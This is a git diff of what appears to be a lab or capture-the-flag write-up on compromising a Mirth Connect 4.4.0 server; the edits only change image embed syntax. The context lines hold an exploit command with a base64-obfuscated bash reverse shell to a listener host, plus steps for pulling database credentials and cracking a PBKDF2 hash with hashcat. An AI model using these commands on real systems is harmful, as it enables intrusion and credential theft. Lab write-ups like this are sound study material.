@@ -35,13 +35,13 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 looking at port 80/443 
 
-![[Pasted image 20260222004147.png]]
+<img src="assets/Pasted image 20260222004147.png">
 
 and the ``webstart.jnlp`` revealed that its running the mirth soft `4.4.0` 
-![[Pasted image 20260222004313.png]]
+<img src="assets/Pasted image 20260222004313.png">
 the msfconsole exploit didnt work like always but revealed the CVE number 
 
-![[Pasted image 20260221225616.png]]
+<img src="assets/Pasted image 20260221225616.png">
 
 which was usefull on doing more recon , after some research, i found these 
 [enumerating-the-rce-vulnerability-on-mirth-connect-4-4-0](https://medium.com/@rahulravi.hulli/enumerating-the-rce-vulnerability-on-mirth-connect-4-4-0-24424258a3b5)
@@ -53,7 +53,7 @@ i reproduced the exploit with the giving script and i execute it and we got a sh
 python3 exploit.py -u https://10.129.1.115/ -c 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zOC80NDQ0IDA+JjEK}|{base64,-d}|bash' 
 ```
 
-![[Pasted image 20260222005016.png]]
+<img src="assets/Pasted image 20260222005016.png">
 
 that was an ez shell 
 
@@ -61,16 +61,16 @@ that was an ez shell
 
 since its a java apllication so it must has the `.properties` file which under the name of `mirth.properties` and it revealed the database creds 
 
-![[Pasted image 20260221225601.png]]
+<img src="assets/Pasted image 20260221225601.png">
 
 connecting to it and we got the passowrd hash 
 
-![[Pasted image 20260221225917.png]]
+<img src="assets/Pasted image 20260221225917.png">
 
 after a while i found a file telling that it is a encrypted cipher .. 
 this file is `keystore.jks` which contains the secrets to decrypt the kys .. thats wat i thought until i found the `mirth` file 
 
-![[Pasted image 20260222005443.png]]
+<img src="assets/Pasted image 20260222005443.png">
 
 getting the `server-crypto.jar` file and decompiling it , the `KeyEncryptor.java` file revealed that it need a header to be completed and that was a loophole . the actual logic is on the `Digest.java` file which reveles its just a **PBKDF2WithHmacSHA256** with the first 8 characters are the salt 
 
@@ -85,11 +85,11 @@ we took the format and we crack it with hashcat
 hashcat -m 10900 'sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=' /usr/share/wordlists/rockyou.txt
 ```
 
-![[Pasted image 20260222004113.png]]
+<img src="assets/Pasted image 20260222004113.png">
 
 and boom we have sedric 
 
-![[Pasted image 20260222005857.png]]
+<img src="assets/Pasted image 20260222005857.png">
 
 
 # Priv escalation 
@@ -132,7 +132,7 @@ EOF
 ```
 
 and here it is 
-![[Pasted image 20260222012050.png]]
+<img src="assets/Pasted image 20260222012050.png">
 
 
-![[Pasted image 20260222012102.png]]
+<img src="assets/Pasted image 20260222012102.png">
